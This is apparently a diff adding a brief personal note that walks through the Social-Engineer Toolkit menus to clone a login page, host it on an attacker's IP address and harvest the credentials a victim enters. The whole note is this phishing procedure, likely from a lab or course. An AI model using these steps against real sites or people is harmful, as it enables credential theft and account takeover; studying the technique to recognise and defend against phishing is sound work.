@@ -1,0 +1,12 @@
+22/01/22
+1) Goto terminal and run commands:
+> setoolkit
+> 1 [// Choose socail engg attack option]
+> 2 [// Coose website attack]
+> 3 [// Credential harvester attack option]
+> 2 [// site clone]
+> <IPADDRESS> [// ip address that hosts the clone website]
+> <enter the url to clone>
+-----go to browser and enter ipaddress and hit enter-----
+-----Enter credentials for login page hit enter-----
+----Switch back to terminal and analyse captured data including the credentials of victim user----
